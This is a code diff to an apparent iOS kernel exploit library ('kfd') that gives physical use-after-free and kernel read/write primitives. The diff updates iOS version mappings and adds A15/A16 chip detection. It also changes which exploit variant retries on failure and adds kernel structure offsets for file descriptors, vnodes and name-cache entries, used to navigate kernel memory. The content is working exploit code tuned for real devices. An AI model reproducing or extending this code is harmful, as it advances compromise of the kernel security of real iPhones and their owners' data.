@@ -34,12 +34,12 @@ int isAvailable(void) {
     size_t len = sizeof(ptrAuthVal);
     assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
     if (@available(iOS 17.0, *)) {
-        return 13;
+        return 14;
     }
     if (@available(iOS 16.4, *)) {
         if (isarm64e())
-            return 12;
-        return 11;
+            return 13;
+        return 12;
     }
     if (@available(iOS 16.2, *)) {
         if (isarm64e())
@@ -75,6 +75,25 @@ int isAvailable(void) {
     return -1;
 }
 
+int ischip(void) {
+    cpu_subtype_t cpuFamily = 0;
+    size_t cpuFamilySize = sizeof(cpuFamily);
+    sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);
+    printf("%x\n", cpuFamily);
+    
+    int ret = 0;
+
+    switch (cpuFamily) {
+        case 0x8765EDEA: // A16
+        ret = 16;
+        break;
+        case 0xDA33D83D: // A15
+        ret = 15;
+        break;
+    }
+    return ret;
+}
+
 struct kfd* kfd_init(uint64_t exploit_type) {
     struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
     info_init(kfd);
@@ -85,7 +104,7 @@ struct kfd* kfd_init(uint64_t exploit_type) {
 }
 
 void kfd_free(struct kfd* kfd) {
-    if(isarm64e() && kfd->info.env.vid >= 6)
+    if(isarm64e() && kfd->info.env.vid >= 8)
         perf_free(kfd);
     krkw_free(kfd);
     puaf_free(kfd);
@@ -108,7 +127,7 @@ retry:
     
     fail = krkw_run(kfd);
     
-    if(fail && (exploit_type == MEOW_EXPLOIT_LANDA)) {
+    if(fail && (exploit_type != MEOW_EXPLOIT_SMITH)) {
         // TODO: fix memory leak
         puaf_free(kfd);
         info_free(kfd);
@@ -121,9 +140,9 @@ retry:
     }
     
     info_run(kfd);
-    if(isarm64e() && kfd->info.env.vid >= 6)
+    if(isarm64e() && kfd->info.env.vid >= 8)
         perf_run(kfd);
-    if(isarm64e() && kfd->info.env.vid <= 5 && kfd->info.env.pplrw)
+    if(isarm64e() && kfd->info.env.vid <= 7 && kfd->info.env.pplrw)
         perf_ptov(kfd);
     puaf_cleanup(kfd);
     
@@ -229,10 +248,6 @@ void kwrite8_kfd(uint64_t va, uint8_t val) {
     kwrite64_kfd(va, u.u64);
 }
 
-uint64_t get_kaslr_slide(void) {
-    return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
-}
-
 uint64_t get_kernel_proc(void) {
     return ((struct kfd*)_kfd)->info.kernel.kernel_proc;
 }
@@ -278,7 +293,7 @@ uint64_t get_kw_object_uaddr(void) {
 }
 
 uint64_t get_kernel_slide(void) {
-    if(((struct kfd*)_kfd)->info.kernel.kernel_slide)
+    if(((struct kfd*)_kfd)->info.kernel.kernel_slide != 0)
         return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
     
     static uint64_t _kernel_slide = 0;
@@ -322,7 +337,7 @@ uint64_t get_kernel_slide(void) {
         ((struct kfd*)_kfd)->info.kernel.kernel_slide = _kernel_slide;
     }
     
-    return _kernel_slide;
+    return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
 }
 
 uint64_t phystokv_kfd(uint64_t pa) {
@@ -349,19 +364,39 @@ uint64_t get_proc(pid_t target) {
 }
 
 uint64_t off_pmap_tte = 0;
+uint64_t off_proc_pfd = 0;
 
-uint64_t off_task_itk_space = 0;
+uint64_t off_fp_glob  = 0;
+uint64_t off_fg_data  = 0;
+uint64_t off_fd_cdir  = 0x20;
 
-uint64_t off_ipc_port_ip_kobject = 0x48;
-uint64_t off_ipc_space_is_table  = 0;
-uint64_t off_ipc_entry_ie_object = 0;
+uint64_t off_task_itk_space         = 0;
+uint64_t off_ipc_space_is_table     = 0;
+uint64_t off_ipc_entry_ie_object    = 0;
+uint64_t off_ipc_port_ip_kobject    = 0x48;
+
+uint64_t off_vnode_v_ncchildren_tqh_first   = 0x30;
+uint64_t off_vnode_v_nclinks_lh_first       = 0x40;
+uint64_t off_vnode_v_name                   = 0xb8;
+
+uint64_t off_namecache_nc_child_tqe_prev    = 0x0;
+uint64_t off_namecache_nc_vp                = 0x48;
 
 void offset_exporter(void) {
     struct kfd* kfd = ((struct kfd*)_kfd);
     off_pmap_tte = static_offsetof(pmap, tte);
+    off_proc_pfd = dynamic_offsetof(proc, p_fd_fd_ofiles);
+    
+    off_fp_glob  = static_offsetof(fileproc, fp_glob);
+    off_fg_data  = static_offsetof(fileglob, fg_data);
+    
     off_task_itk_space = dynamic_offsetof(task, itk_space);
     off_ipc_space_is_table  = static_offsetof(ipc_space, is_table);
     off_ipc_entry_ie_object = static_offsetof(ipc_entry, ie_object);
+    
+    if(kfd->info.env.vid <= 11) {
+        off_namecache_nc_child_tqe_prev = 0x10;
+    }
     
     if(kfd->info.env.vid <= 7) {
         off_ipc_port_ip_kobject = 0x58;
